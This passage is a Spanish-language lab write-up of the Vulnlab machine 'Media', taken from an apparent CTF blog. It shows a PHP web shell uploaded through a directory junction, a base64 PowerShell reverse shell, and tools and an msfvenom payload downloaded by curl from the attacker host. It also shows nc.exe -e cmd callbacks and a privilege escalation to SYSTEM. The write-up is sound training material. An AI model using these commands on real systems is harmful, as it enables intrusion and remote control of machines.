+                    <span class="nt">&lt;input</span> <span class="na">class=</span><span class="s">"btn btn-primary btn-xl text-uppercase"</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Upload File"</span>
+                        <span class="na">name=</span><span class="s">"submit"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/form&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/section&gt;</span>
+
+    <span class="c">&lt;!-- Footer--&gt;</span>
+    <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"footer py-4"</span><span class="nt">&gt;</span>
+        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row align-items-center"</span><span class="nt">&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4 text-lg-start"</span><span class="nt">&gt;</span>Copyright <span class="ni">&amp;copy;</span> ProMotion Studios 2023<span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4 my-3 my-lg-0"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Twitter"</span><span class="nt">&gt;&lt;i</span>
+                            <span class="na">class=</span><span class="s">"fab fa-twitter"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"Facebook"</span><span class="nt">&gt;&lt;i</span>
+                            <span class="na">class=</span><span class="s">"fab fa-facebook-f"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"btn btn-dark btn-social mx-2"</span> <span class="na">href=</span><span class="s">"#!"</span> <span class="na">aria-label=</span><span class="s">"LinkedIn"</span><span class="nt">&gt;&lt;i</span>
+                            <span class="na">class=</span><span class="s">"fab fa-linkedin-in"</span><span class="nt">&gt;&lt;/i&gt;&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-4 text-lg-end"</span><span class="nt">&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"link-dark text-decoration-none me-3"</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;</span>Privacy Policy<span class="nt">&lt;/a&gt;</span>
+                    <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"link-dark text-decoration-none"</span> <span class="na">href=</span><span class="s">"#!"</span><span class="nt">&gt;</span>Terms of Use<span class="nt">&lt;/a&gt;</span>
+                <span class="nt">&lt;/div&gt;</span>
+            <span class="nt">&lt;/div&gt;</span>
+        <span class="nt">&lt;/div&gt;</span>
+    <span class="nt">&lt;/footer&gt;</span>
+    <span class="c">&lt;!-- Bootstrap core JS--&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+    <span class="c">&lt;!-- Core theme JS--&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"js/scripts.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+
+<span class="nt">&lt;/html&gt;</span>
+enox@MEDIA C:\xampp\htdocs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el código todo lo que subimos se guarda en la ruta <code class="language-plaintext highlighter-rouge">C:/Windows/Tasks/Uploads/</code>, pero lo que ingresamos lo convierte en <strong>MD5</strong> por ejemplo nosotros ingresamos <strong>test</strong> en todo entonces se supone que lo debería hacer de la siguiente manera: fuente:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"testtesttest@test.com"</span> | <span class="nb">md5sum
+</span>44b85c98e94039c8a0a015f6d3a3449e  -
+➜  ~
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Una forma de asegurar esto es ver el contenido de la ruta donde se guardan y ver si ingresan los datos, de esta manera se guardan en <strong>MD5</strong>.</p>
+  </li>
+  <li>
+    <p>Y bueno, al parecer si lo hace.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enox@MEDIA C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\U</span>ploads&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\U</span>ploads
+
+02/29/2024  11:28 AM    &lt;DIR&gt;          <span class="nb">.</span>
+10/02/2023  10:04 AM    &lt;DIR&gt;          ..
+02/29/2024  11:27 AM    &lt;DIR&gt;          44b85c98e94039c8a0a015f6d3a3449e
+02/29/2024  11:28 AM                 0 todo.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>              0 bytes
+               3 Dir<span class="o">(</span>s<span class="o">)</span>   8,547,569,664 bytes free
+
+enox@MEDIA C:<span class="se">\W</span>indows<span class="se">\T</span>asks<span class="se">\U</span>ploads&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Vamos a crear un enlace simbólico a la ruta <code class="language-plaintext highlighter-rouge">C:\xampp\htdocss</code>  para poder subir nuestra web shell con <strong>mlink</strong> <a href="https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/mklink">https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/mklink</a> .</p>
+  </li>
+  <li>
+    <p>Primero vamos a borrar el directorio generado.</p>
+  </li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enox</span><span class="err">@</span><span class="nx">MEDIA</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="nx">powershell</span><span class="w">
+</span><span class="n">Windows</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w">
+</span><span class="n">Copyright</span><span class="w"> </span><span class="p">(</span><span class="n">C</span><span class="p">)</span><span class="w"> </span><span class="nx">Microsoft</span><span class="w"> </span><span class="nx">Corporation.</span><span class="w"> </span><span class="nx">All</span><span class="w"> </span><span class="nx">rights</span><span class="w"> </span><span class="nx">reserved.</span><span class="w">
+
+</span><span class="n">Install</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">latest</span><span class="w"> </span><span class="nx">PowerShell</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">new</span><span class="w"> </span><span class="nx">features</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">improvements</span><span class="o">!</span><span class="w"> </span><span class="nx">https://aka.ms/PSWindows</span><span class="w">
+
+</span><span class="n">PS</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">rmdir</span><span class="w"> </span><span class="nx">C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\</span><span class="w">
+
+</span><span class="n">Confirm</span><span class="w">
+</span><span class="nx">The</span><span class="w"> </span><span class="nx">item</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e\</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">children</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">Recurse</span><span class="w"> </span><span class="nx">parameter</span><span class="w"> </span><span class="nx">was</span><span class="w"> </span><span class="nx">not</span><span class="w"> </span><span class="nx">specified.</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">continue</span><span class="p">,</span><span class="w">
+</span><span class="n">all</span><span class="w"> </span><span class="nx">children</span><span class="w"> </span><span class="nx">will</span><span class="w"> </span><span class="nx">be</span><span class="w"> </span><span class="nx">removed</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">item.</span><span class="w"> </span><span class="nx">Are</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">sure</span><span class="w"> </span><span class="nx">you</span><span class="w"> </span><span class="nx">want</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">continue</span><span class="nf">?</span><span class="w">
+</span><span class="p">[</span><span class="n">Y</span><span class="p">]</span><span class="w"> </span><span class="n">Yes</span><span class="w">  </span><span class="p">[</span><span class="n">A</span><span class="p">]</span><span class="w"> </span><span class="n">Yes</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">All</span><span class="w">  </span><span class="p">[</span><span class="n">N</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w">  </span><span class="p">[</span><span class="n">L</span><span class="p">]</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">All</span><span class="w">  </span><span class="p">[</span><span class="n">S</span><span class="p">]</span><span class="w"> </span><span class="n">Suspend</span><span class="w">  </span><span class="p">[</span><span class="nf">?</span><span class="p">]</span><span class="w"> </span><span class="n">Help</span><span class="w"> </span><span class="p">(</span><span class="n">default</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="s2">"Y"</span><span class="p">):</span><span class="w"> </span><span class="n">Y</span><span class="w">
+</span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Ahora creamos el enlace desde la <strong>cmd</strong>.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">enox</span><span class="err">@</span><span class="nx">MEDIA</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="nx">mklink</span><span class="w"> </span><span class="nx">/J</span><span class="w"> </span><span class="nx">C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e</span><span class="w"> </span><span class="nx">C:\xampp\htdocss</span><span class="w">
+</span><span class="n">Junction</span><span class="w"> </span><span class="nx">created</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">C:\Windows\Tasks\Uploads\44b85c98e94039c8a0a015f6d3a3449e</span><span class="w"> </span><span class="err">&lt;&lt;</span><span class="o">===</span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">C:\xampp\htdocss</span><span class="w">
+
+</span><span class="n">enox</span><span class="err">@</span><span class="nx">MEDIA</span><span class="w"> </span><span class="nx">C:\xampp\htdocs</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Con esto lo que logramos es que el directorio <strong>44b85c98e94039c8a0a015f6d3a3449e</strong> está en <strong>C:\xampp\htdocss</strong>, ya que se creó el <strong>Juction</strong> ahora vamos a hacer él <strong>.php</strong> para enviarnos la reverse shell.</li>
+</ul>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ cat cmd.php
+<span class="cp">&lt;?php</span>
+	<span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">]);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora, con los mismos valores que teníamos con <strong>test</strong> en la parte del <strong>MD5</strong> vamos a subir la <strong>shell</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/2JDcTIi.png" />
+</p>
+
+<ul>
+  <li>Y vemos que tenemos él <strong>.php</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enox@MEDIA C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;dir
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is EAD8-5D48
+
+ Directory of C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs
+
+03/01/2024  01:21 PM    &lt;DIR&gt;          <span class="nb">.</span>
+03/01/2024  01:12 PM    &lt;DIR&gt;          ..
+10/02/2023  09:27 AM    &lt;DIR&gt;          assets
+03/01/2024  01:21 PM                32 cmd.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          css
+10/10/2023  04:00 AM            20,563 index.php
+10/02/2023  09:27 AM    &lt;DIR&gt;          js
+               2 File<span class="o">(</span>s<span class="o">)</span>         20,595 bytes
+               5 Dir<span class="o">(</span>s<span class="o">)</span>   8,555,507,712 bytes free
+
+enox@MEDIA C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<p align="center">
+<img src="https://i.imgur.com/7Q5JXSq.png" />
+</p>
+
+<h2 id="shell-as-nt-authoritylocal">Shell as nt authority\local</h2>
+
+<ul>
+  <li>Ahora nos ponemos en escucha para enviarnos una reverse shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a utilizar el siguiente recurso para crear el oneliner en powershell usando <strong>base64</strong> . <a href="https://www.revshells.com/">https://www.revshells.com/</a>.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">http://10.10.111.108/cmd.php</span><span class="nf">?</span><span class="nx">cmd</span><span class="o">=</span><span class="nx">powershell</span><span class="w"> </span><span class="nt">-e</span><span class="w"> </span><span class="nx">JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADEALgAxADIANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Nos llega la <strong>shell</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ rlwrap nc <span class="nt">-lvnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>10.8.1.127] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.111.108] 50309
+<span class="nb">whoami
+</span>nt authority<span class="se">\l</span>ocal service
+PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Verificamos que no tenemos todos los privilegios máximos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt; <span class="nb">whoami</span> /all
+
+USER INFORMATION
+<span class="nt">----------------</span>
+
+User Name                  SID
+<span class="o">==========================</span> <span class="o">========</span>
+nt authority<span class="se">\l</span>ocal service S-1-5-19
+
+
+GROUP INFORMATION
+<span class="nt">-----------------</span>
+
+Group Name                             Type             SID                                                                                              Attributes
+<span class="o">======================================</span> <span class="o">================</span> <span class="o">================================================================================================</span> <span class="o">==================================================</span>
+Mandatory Label<span class="se">\S</span>ystem Mandatory Level Label            S-1-16-16384                                                                            
+Everyone                               Well-known group S-1-1-0                                                                                          Mandatory group, Enabled by default, Enabled group
+BUILTIN<span class="se">\U</span>sers                          Alias            S-1-5-32-545                                                                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\S</span>ERVICE                   Well-known group S-1-5-6                                                                                          Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1                                                                                          Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11                                                                                         Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY<span class="se">\T</span>his Organization         Well-known group S-1-5-15                                                                                         Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0                                                                                          Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-1488445330-856673777-1515413738-1380768593-2977925950-2228326386-886087428-2802422674   Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-383293015-3350740429-1839969850-1819881064-1569454686-4198502490-78857879-1413643331    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-2035927579-283314533-3422103930-3587774809-765962649-3034203285-3544878962-607181067    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-3659434007-2290108278-1125199667-3679670526-1293081662-2164323352-1777701501-2595986263 Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-11742800-2107441976-3443185924-4134956905-3840447964-3749968454-3843513199-670971053    Mandatory group, Enabled by default, Enabled group
+                                       Unknown SID <span class="nb">type </span>S-1-5-32-3523901360-1745872541-794127107-675934034-1867954868-1951917511-1111796624-2052600462   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+<span class="nt">----------------------</span>
+
+Privilege Name                Description                         State 
+<span class="o">=============================</span> <span class="o">===================================</span> <span class="o">========</span>
+SeTcbPrivilege                Act as part of the operating system Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeCreateGlobalPrivilege       Create global objects               Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set      </span>Disabled
+SeTimeZonePrivilege           Change the <span class="nb">time </span>zone                Disabled
+
+PS C:<span class="se">\x</span>ampp<span class="se">\h</span>tdocs&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Para esto podemos usar la siguiente herramienta <a href="https://github.com/itm4n/FullPowers">https://github.com/itm4n/FullPowers</a> que nos recupera los privilegios por defecto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\&gt;</span> <span class="nb">mkdir </span>Temp
+
+
+    Directory: C:<span class="se">\</span>
+
+
+Mode                 LastWriteTime         Length Name                  
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                  
+d-----          3/1/2024   1:34 PM                Temp                  
+
+
+PS C:<span class="se">\&gt;</span> <span class="nb">cd </span>Temp
+PS C:<span class="se">\T</span>emp&gt; curl <span class="nt">-o</span> FullPowers.exe http://10.8.1.127:8080/FullPowers.exe
+PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\T</span>emp
+
+
+Mode                 LastWriteTime         Length Name                  
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                  
+<span class="nt">-a----</span>          3/1/2024   1:36 PM          36864 FullPowers.exe        
+
+
+PS C:<span class="se">\T</span>emp&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora también vamos a subir el netcat para enviarnos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  Downloads <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; curl <span class="nt">-o</span> nc.exe http://10.8.1.127:8080/nc.exe
+PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
+
+
+    </span>Directory: C:<span class="se">\T</span>emp
+
+
+Mode                 LastWriteTime         Length Name                  
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                  
+<span class="nt">-a----</span>          3/1/2024   1:36 PM          36864 FullPowers.exe        
+<span class="nt">-a----</span>          3/1/2024   1:38 PM          28160 nc.exe                
+
+
+PS C:<span class="se">\T</span>emp&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora nos podemos en escucha otra vez.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; .<span class="se">\F</span>ullPowers.exe <span class="nt">-c</span> <span class="s2">"C:</span><span class="se">\T</span><span class="s2">emp</span><span class="se">\n</span><span class="s2">c.exe 10.8.1.127 445 -e cmd"</span> <span class="nt">-z</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y obtenemos la shell.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content rlwrap nc <span class="nt">-nlvp</span> 445
+listening on <span class="o">[</span>any] 445 ...
+connect to <span class="o">[</span>10.8.1.127] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.111.108] 50452
+Microsoft Windows <span class="o">[</span>Version 10.0.20348.1970]
+<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami
+<span class="nb">whoami
+</span>nt authority<span class="se">\l</span>ocal service
+
+C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
+</code></pre></div></div>
+
+<h2 id="nt-authority-system">nt authority system</h2>
+
+<ul>
+  <li>Podemos abusar del <strong>SeImpersonatePrivilege</strong> usando el <a href="https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1">https://github.com/antonioCoco/JuicyPotatoNG/releases/tag/v1.1</a> o con <strong>metasploit</strong> <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato</a> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.8.1.127 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="o">&gt;</span> reverse_shell.exe
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~ <span class="nb">sudo </span>msfconsole
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>miguel:
+Metasploit tip: Set the current module<span class="s1">'s RHOSTS with database values using
+hosts -R or services -R
+
+
+ ______________________________________________________________________________
+|                                                                              |
+|                   METASPLOIT CYBER MISSILE COMMAND V5                        |
+|______________________________________________________________________________|
+      \                                  /                      /
+       \     .                          /                      /            x
+        \                              /                      /
+         \                            /          +           /
+          \            +             /                      /
+           *                        /                      /
+                                   /      .               /
+    X                             /                      /            X
+                                 /                     ###
+                                /                     # % #
+                               /                       ###
+                      .       /
+     .                       /      .            *           .
+                            /
+                           *
+                  +                       *
+
+                                       ^
+####      __     __     __          #######         __     __     __        ####
+####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####
+################################################################################
+################################################################################
+# WAVE 5 ######## SCORE 31337 ################################## HIGH FFFFFFFF #
+################################################################################
+                                                           https://metasploit.com
+
+
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2397 exploits - 1235 auxiliary - 422 post       ]
++ -- --=[ 1391 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 &gt; use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+payload =&gt; windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 10.8.1.127
+LHOST =&gt; 10.8.1.127
+msf6 exploit(multi/handler) &gt; set LPORT 443
+LPORT =&gt; 443
+msf6 exploit(multi/handler) &gt; exploit
+
+[*] Started reverse TCP handler on 10.8.1.127:443
+</span></code></pre></div></div>
+
+<ul>
+  <li>Después lo descargamos y lo ejecutamos en la máquina víctima.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\T</span>emp&gt; curl <span class="nt">-o</span> rev.exe http://10.8.1.127:8080/reverse_shell.exe
+curl <span class="nt">-o</span> rev.exe http://10.8.1.127:8080/reverse_shell.exe
+PS C:<span class="se">\T</span>emp&gt; <span class="nb">dir
+dir
+
+
+    </span>Directory: C:<span class="se">\T</span>emp
+
+
+Mode                 LastWriteTime         Length Name                                  
+<span class="nt">----</span>                 <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                        
+<span class="nt">-a----</span>          3/1/2024   1:57 PM         153600 JuicyPotatoNG.exe                     
+<span class="nt">-a----</span>          3/1/2024   1:38 PM          28160 nc.exe                                
+<span class="nt">-a----</span>          3/1/2024   2:35 PM          73802 rev.exe                               
+
+
+PS C:<span class="se">\T</span>emp&gt; .<span class="se">\r</span>ev.exe
+.<span class="se">\r</span>ev.exe
+PS C:<span class="se">\T</span>emp&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>multi/handler<span class="o">)</span> <span class="o">&gt;</span> exploit
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.8.1.127:443
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176198 bytes<span class="o">)</span> to 10.10.111.108
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.8.1.127:443 -&gt; 10.10.111.108:51168<span class="o">)</span> at 2024-03-01 16:37:07 <span class="nt">-0600</span>
+
+meterpreter <span class="o">&gt;</span> getsystem
+...got system via technique 5 <span class="o">(</span>Named Pipe Impersonation <span class="o">(</span>PrintSpooler variant<span class="o">))</span><span class="nb">.</span>
+meterpreter <span class="o">&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Y listo.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/ooJo7Sd.png" />
+</p>
+
+<h2 id="roottxt">Root.txt</h2>
+
+<ul>
+  <li>Ahora vemos la flag.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/fObra6i.png" />
+</p>
+
+
+  </div><a class="u-url" href="/vulnlab/machines/2024/03/26/media.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
